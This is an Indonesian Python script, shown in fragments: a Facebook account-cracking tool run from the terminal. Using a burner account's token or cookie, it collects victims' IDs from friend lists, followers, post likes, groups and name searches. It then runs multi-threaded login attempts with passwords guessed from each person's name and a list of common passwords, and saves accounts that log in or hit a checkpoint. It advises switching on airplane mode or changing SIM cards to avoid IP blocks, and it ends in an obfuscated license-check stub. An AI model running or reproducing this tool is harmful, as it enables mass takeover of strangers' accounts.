...
import os,sys,random,datetime,time,re,json

try:
	import rich
except ImportError:
	print ('\n\x1b[0mSedang menginstal module rich...\n')
...
try:
	...
	print ('\nSedang menginstall modul requests...\n')
...
try:
	...
	print ('\nSedang menginstall modul mechanize...\n')
...
s = parser(requests.get(url_main, headers={"user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}).text, "html.parser")
...
jenis_os = os_.replace("os: ", "") #PERANGKAT
...
#Data Baca
sys.stdout.write('\x1b[1;35m\x1b]2;pengen jadi hacker\x07')
sys.stdout.write('\x1b[0;37mTunggu sebentar ...\n')
...
# False
def false():
	laura = '[!] LOGIN GAGAL, SILAHKAN CEK AKUN TUMBAL'
	rprint(nel(laura, style = 'blue'))
	exit()
...
def dany():
	try:
		...
		try:
			...
			laura = '[!] KONEKSI INTERNET BERMASALAH'
			rprint(nel(laura, style = 'blue'))
			exit()
	except IOError:
		mantan()
...
def mantan():
	...
	print(' ')
	laura = 'HARAP LOGIN'
	rprint(nel(laura, style = 'cyan'))
	laura = '[01]. Login dengan token facebook\n[02]. Login dengan cookie facebook\n[04]. Cara mendapatkan token EAAB'
	rprint(nel(laura, style = 'cyan'))
	__Login__ = input(x+'['+h+'•'+x+'] Input 1 sampai 3 : ')
	if __Login__ in ['1','01']:
		laura = '[!] DISARANKAN UNTUK MENGGUNAKAN TOKEN *EAAB* JIKA BELUM TAU CARA MENDAPATKAN NYA PILIH MENU NOMOR 5'
		panda = input(x+'\n['+h+'•'+x+'] Masukan token : ')
		akun=open('.token.txt','w').write(panda)
		try:
			tes = requests.get('https://graph.facebook.com/me?access_token='+panda)
			tes3 = json.loads(tes.text)['id']
			laura = '[!] BERHASIL LOGIN'
			rprint(nel(laura, style = 'blue'))
			time.sleep(2)
			menu()
		except KeyError:
			laura = '[!] LOGIN GAGAL, SILAHKAN CEK AKUN TUMBAL NYA'
			rprint(nel(laura, style = 'blue'))
			time.sleep(1)
			mantan()
		except requests.exceptions.ConnectionError:
			laura = '[!] KONEKSI EROR, HARAP PAKAI DATA SELULER'
			rprint(nel(laura, style = 'blue'))
			exit()
	elif __Login__ in ['2','02']:
		try:
			cookie = input(x+'\n['+h+'•'+x+'] Masukan cookie : ')
			...
			rprint(nel(laura, style = 'blue'))
			mantan()
	#elif __Login__ in ['3','03']:
		#os.system("xdg-open https://mbasic.facebook.com/reg/?cid=103&ref=dbl&refsrc=deprecated&_rdr")
		#mantan()
	elif __Login__ in ['3','03']:
		os.system("xdg-open https://youtu.be/iDVCcnLcTnE")
		mantan()
	#elif __login__ in ['5','05']:
		#os.system("xdg-open https://youtu.be/-o_0Bwpj_Po")
		#mantan()
...
def menu():
	...
	try:IP = cek_data["query"]
	except:IP = {'-'}
	try:negara = cek_data["country"]
	except:negara = {'-'}
	try:kartu = cek_data["isp"]
	except:kartu = {'-'}
	try:
		token = open('.token.txt','r').read()
		tokenku.append(token)
		yntkts = requests.get('https://graph.facebook.com/me?access_token='+tokenku[0])
		meki = json.loads(cek_tk.text)['name']
		kontol = json.loads(cek_tk.text)['id']
		memek = json.loads(cek_tk.text)['birthday']
	except:yntkts = {'-'}
	banner()
	status = '[•]STATUS : PREMIUM\n[•]AUTHOR : DANZZ X NANO\n[•]WA DANZ : 081295853971\n[•] IP :'     +str(sh['origin'])
	rprint(nel(status, style = 'green'))
	laura = '[01]. Crack dari teman publik \n[02]. Crack dari teman publik (MASAL)\n[03]. Crack dari followers publik \n[04]. Crack dari followers publik (MASAL)\n[05]. Crack dari like postingan\n[06]. Crack dari anggota grup\n[07]. Crack dari pencarian nama\n[08]. Mengumpulkan id teman publik\n[09]. Cek results crack\n[10]. Cek opsi checkpoint\n[11]. Crack Id Old ( NEXT UPDATE)\n[00]. Keluar & hapus token'
	rprint(nel(laura, style = 'cyan'))
	__Laura__ = input(x+'['+h+'•'+x+'] Input 1 sampai 10 : ')
	if __Laura__ in ['1','01']:
		dump_publik()
	elif __Laura__ in ['2','02']:
		dump_massal()
	elif __Laura__ in ['3','03']:
		dump_follower()
	elif __Laura__ in ['4','04']:
		dump_follower_v2()
	elif __Laura__ in ['5','05']:
		likes()
	elif __Laura__ in ['6','06']:
		grup()
	elif __Laura__ in ['7','07']:
		nama()
	elif __Laura__ in ['8','08']:
		ambilid()
	elif __Laura__ in ['9','09']:
		result()
	elif __Laura__ in ['10','010']:
		file()
	elif __Laura__ in ['11','011']:
		dumpold()
	elif __Laura__ in ['0','00']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf cookie.txt')
		laura = '[!] SEDANG MENGHAPUS INFO LOGIN'
		rprint(nel(laura, style = 'blue'))
		time.sleep(2)
		laura = '[!] BERHASIL TERHAPUS'
		rprint(nel(laura, style = 'blue'))
		exit()
	else:
...
# RESULT CHECKER
def result():
	laura = '[01]. Cek hasil akun CP\n[02]. Cek hasil akun OK\n[00]. Kembali ke menu utama'
	rprint(nel(laura, style = 'cyan'))
	__Hasil__ = input(x+'['+h+'•'+x+'] Input 1 sampai 2 : ')
	if __Hasil__ in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			laura = 'FILE NDAK ADA TOD'
			rprint(nel(laura, style = 'blue'))
			time.sleep(2)
			back()
		if len(vin)==0:
			laura = 'BELUM ADA HASIL CP TERSIMPAN'
			rprint(nel(laura, style = 'blue'))
			time.sleep(2)
			back()
		else:
			...
			laura = '[!] SILAHKAN PILIH RESULT YANG INGIN DITAMPILKAN'
			rprint(nel(laura, style = 'blue'))
			geeh = input(x+'['+p+'•'+x+'] Input nomor : ')
			try:geh = lol[geeh]
			except KeyError:
				laura = '[!] YANG BENER'
				rprint(nel(laura, style = 'blue'))
			...
			try:lin = open('CP/'+geh,'r').read()
				...
				laura = 'FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI'
				time.sleep(2)
				back()
			laura = '[•] FILE HASIL CP YANG TERSIMPAN'
			rprint(nel(laura, style = 'blue'))
			hus = os.system('cd CP && cat '+geh)
			laura = '[•] SELESAI MENGECEK RESULTS'
			rprint(nel(laura, style = 'blue'))
			time.sleep(1)
			exit()
	elif __Hasil__ in ['2','02']:
		try:vin = os.listdir('OK')
			...
			menu()
		if len(vin)==0:
			'BELUM ADA HASIL OK TERSIMPAN'
			rprint(nel(laura, style = 'blue'))
			time.sleep(2)
			menu()
		else:
			laura = 'HASIL AKUN OK ANDA'
			rprint(nel(laura, style = 'blue'))
			cih = 0
			lol = {}
			for isi in vin:
				...
				if cih<100:
					...
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+']. '+isi+' --> '+str(len(hem))+' Akun'+x)
			laura = '[!] SILAHKAN PILIH RESULT UNTUK DITAMPILKAN'
			rprint(nel(laura, style = 'blue'))
			geeh = input(x+'['+p+'•'+x+'] Input nomor : ')
			try:geh = lol[geeh]
			except KeyError:
			...
			try:lin = open('OK/'+geh,'r').read()
				...
				time.sleep(2)
				menu()
			laura = '[!] FILE HASIL OK YANG TERSIMPAN'
			rprint(nel(laura, style = 'blue'))
...
# OPEN
def file():
	laura = 'CEK OPSI DARI FILE'
	rprint(nel(laura, style = 'cyan'))
	print(x+'['+h+'•'+x+'] Sedang membaca file, tunggu sebentar ...')
	time.sleep(2)
	laura = 'PILIH FILE YG AKAN DI CEK'
	rprint(nel(laura, style = 'blue'))
	my_files = []
	try:
	...
	if len(my_files)==0:
		laura = '[!] BELUM ADA HASIL UNTUK DI CEK'
		rprint(nel(laura, style = 'blue'))
		exit()
	else:
		cih = 0
		...
		for isi in my_files:
			...
			if cih<10:
				...
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
		laura = 'PILIH FILE YANG INGIN DI CEK'
		rprint(nel(laura, style = 'blue'))
...
def dumpold():
	try:
		...
		exit()
	laura = 'Ketik *me* untuk dump teman sendiri'
	rprint(nel(laura, style = 'red'))
	pil = input(x+'['+h+'•'+x+'] Masukkan id/username : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(6000)&access_token='+tokenku[0]).json()
		for pi in koh2['friends']['1000000000']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(x+'['+h+'•'+x+'] Total id : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		laura = '[!]KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
		rprint(nel(laura, style = 'blue'))
		exit()
	except (KeyError,IOError):
		laura = '[!] PERTEMANAN TIDAK PUBLIK ATAU TOKEN RUSAK'
		rprint(nel(laura, style = 'blue'))
		exit()
...
# DUMP ID MASSAL
def dump_massal():
	laura = 'MASUKAN JUMLAH ID (Maximal 10 ID)'
	rprint(nel(laura, style = 'red'))
	try:
		jum = int(input(x+'['+p+'•'+x+'] Ingin dump berapa id : '))
	except ValueError:
		laura = '[!] INPUT YANG BENER'
		rprint(nel(laura, style = 'blue'))
		exit()
	if jum<1 or jum>10:
		laura = '[!] INPUT YANG BENER'
	...
	for met in range(jum):
		yz+=1
		kl = input(x+'['+h+str(yz)+x+'] Masukan id ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v13.0/'+userr+'?fields=friends.limit(10000)&access_token='+tokenku[0]).json()
...
def dump_follower():
	...
	try:
		...
		rprint(nel(laura, style = 'blue'))
		exit()
#Dump Follwers Massal
def dump_follower_v2():
	try:
		token = open('.token.txt','r').read()
	except IOError:
		exit()
	print(' ')
	try:
		jum = int(input(x+'\n['+p+'•'+x+'] Ingin dump berapa id (Maximal 10 ID) : '))
	except ValueError:
		laura = '[!] INPUT YANG BENER'
		rprint(nel(laura, style = 'blue'))
		exit()
...
def likes():
	try:
		...
		time.sleep(0.01)
		exit()
	idt = input(x+'\n['+h+'•'+x+'] Masukan id postingan : ')
	try:
		jumlah = int(input(x+'['+h+'•'+x+'] Masukan limit : '))
		if jumlah>20000:
			laura = '[!] MAXIMAL LIMIT 20000 (20K) ID'
			rprint(nel(laura, style = 'blue'))
			time.sleep(1)
			likes()
...
def grup():
	...
	try:
		...
		laura = '[!] Koneksi Internet Terputus'
		rprint(nel(laura, style = 'red'))
		time.sleep(2)
		exit()
	berr = gn.find("title")
	...
	if berr2=='Masuk Facebook':
		laura = 'Akun terkena limit, silahkan mode pesawat dan coba lagi..'
		rprint(nel(laura, style = 'blue'))
		time.sleep(2)
		exit()
...
def grup1(urls):
	use = []
	ses = requests.Session()
	laura = '[!] SEDANG MENGUMPULKAN ID'
	rprint(nel(laura, style = 'blue'))
	laura = 'NOTE: JIKA STUCK ATAU BERHENTI, SILAHKAN MODE PESAWAT 3 DETIK SAJA DAN UNTUK BERHENTI TEKAN CTRL + C'
	rprint(nel(laura, style = 'blue'))
	while True:
		try:
			ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
			...
			for cari in tes:
				...
				if 'mengajukan' in spl:
					...
					if idku in id:
						...
						id.append(idku)
						print(("\r\n { "+x+"Proses Mengambil ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()
				elif '>' in spl:
					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
					idyou =	idsiapa[0].replace('content_owner_id_new.','')
					...
					if idku in id:
						...
						id.append(idku)
						print(("\r\n{ "+x+"Mengumpulkan ID "+str(len(id))+x+" }"), end="");sys.stdout.flush()
				else:
					continue
			try:
				link_ = bcj2
...
#Dump pencarian nama
def nama():
	nama = input(x+'\n['+h+'•'+x+'] Masukan nama yang anda cari : ')
	laura = '[!] UNTUK BERHENTI, TEKAN CTRL + C'
	rprint(nel(laura, style = 'blue'))
	link = []
	na = []
	...
	while True:
		try:
			...
			if link7=='taik':
				if len(id)==0:
					laura = 'Akun limit, silahkan mode pesawat dan coba lagi'
					rprint(nel(laura, style = 'blue'))
					time.sleep(2)
					exit()
				else:pass
...
#Len(Id)
def lah():
	print("\r\n[•] Total id  : %s"+str(len(id))+"                     ")
	setting()
# PENGATURAN ID
def setting():
	laura = '[•] Silahkan pilih urutan id crack'
	rprint(nel(laura, style = 'blue'))
	laura = '[01]. Crack dari akun tertua\n[02]. Crack dari akun termuda\n[03]. Crack secara urutan acak id'
	rprint(nel(laura, style = 'blue'))
	__Moch__Aang__ = input(x+'['+h+'•'+x+'] Input 1 sampai 3 : ')
	if __Moch__Aang__ in ['1','01']:
		for bacot in id:
			id2.append(bacot)
	elif __Moch__Aang__ in ['2','02']:
		for bacot in id:
			id2.insert(0,bacot)
	elif __Moch__Aang__ in ['3','03']:
		for bacot in id:
		...
		time.sleep(2)
		exit()
	laura = '[•] Silahkan pilih metode crack'
	rprint(nel(laura, style = 'blue'))
	laura = '[01]. Metode b-api\n[02]. Metode free facebook\n[03]. Metode mbasic\n[04]. Metode mobile v1 --> disarankan\n[05]. Metode mobile v2'
	rprint(nel(laura, style = 'blue'))
	__mantan__= input(x+'['+h+'•'+x+'] Input 1 sampai 5 : ')
	if __mantan__ in ['1','01']:
		method.append('api')
	elif __mantan__ in ['4','04']:
		method.append('mobilev2')
	elif __mantan__ in ['5','05']:
		method.append('mobilev2')
	elif __mantan__ in ['3','03']:
		method.append('mbasic')
	else:
		method.append('free')
	laura = '[•] SILAHKAN PILIH SESUKA HATI KALIAN'
	rprint(nel(laura, style = 'blue'))
	__pepek__ = input(x+'['+h+'•'+x+'] Tampilkan info akun dan aplikasi terkait ? (y/t): ')
	if __pepek__ in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	__meki__ = input(x+'['+h+'•'+x+'] Munculkan opsi checkpoin ? (y/t): ')
	if __meki__ in ['y','Y']:
		oprek.append('ya')
	else:
		oprek.append('no')
...
# WORDLIST
def passwrd():
	laura = 'Note : Jika hasil sedikit atau rata² cp, silahkan aktifkan mode pesawat 3 detik saja setiap 5 menit agar terhindar dari spam ip'
	rprint(nel(laura, style = 'blue'))
	laura = '[•] Hasil akun yang OK tersimpan di : OK/%s\n[•] Hasil akun yang CP tersimpan di : CP/%s'%(okc,cpc)
	rprint(nel(laura, style = 'blue'))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['sayang','bajingan','bangsat','anjing','kontol','bismillah','katasandi','akusayangkamu','rahasia','indonesia']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
			...
			if 'mobilev1' in method:
				...
				pool.submit(crack,idf,pwv)
	laura = '[!] PROSES CRACK SELESAI ...'
	rprint(nel(laura, style = 'blue'))
	__bokep__ = input(x+'['+h+'•'+x+'] Ingin langsung cek opsi checkpoin ? (y/t): ')
	if __bokep__ in ['y','Y']:
		cek_opsi()
	else:
		exit()
...
def crack1(idf,pwv):
	...
	pers = loop*100/len(id2)
	fff = '%'
	sys.stdout.write('\r%s|__ Crack %s/%s Ok-:%s Cp-:0'%(P,loop,len(id2),ok));sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
...
def crack2(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			if "session_key" in resp.text and "EAAA" in resp.text:
				print('\r%s|__ %s%s|%s                    \n%s                  '%(P,H,idf,pw,kuki))
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				ok+=1
				break
...
def cek_apk(kuki):
	...
	try:
		for i in range(len(game)):
			print ("\r%s|___ Aktif%s. %s%s"%(P,i+1,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	...
	try:
		for i in range(len(game)):
			print ("\r    %s|__ Off [\x1b[0;35m%s\x1b[0;37m]. %s%s"%(P,i+1,Q,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\n%s• cookie invalid"%(M))
...
def cek_opsi():
	c = len(akun)
	laura = '[!] Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
	rprint(nel(laura, style = 'blue'))
	input(x+'['+h+'•'+x+'] Mulai')
	laura = '[!] PROSES CEK OPSI DIMULAI'
	rprint(nel(laura, style = 'blue'))
	love = 0
	for kes in akun:
		try:
...
""")#line:49
    ...
    if OOO00O0OOO00OO00O in ['1','01']:#line:51
      ...
      if len (O000O000OOO000OOO )==0 :#line:55
        ...
        with requests .Session ()as O0O0OO0O0O00OOOO0 :#line:58   #### ISI TOKEN LU DAN   ID LU
          OOO00OO00O0O0OOOO =O0O0OO0O0O00OOOO0 .get (f'https://app.cryptolens.io/api/key/activate?token=WyIxNzUyODg2OSIsIk5vTzZmK1Z4UUdnVm5EbWQxSHM3Z2cybVpnald5S1F4c2lma3FGaGEiXQ==&ProductId=14543&Key={O000O000OOO000OOO}&Sign=True').json ()['licenseKey']#line:59
    ...
    print (f"{P}[{M}!{P}]{B} Berhasil")#line:67
    dany()
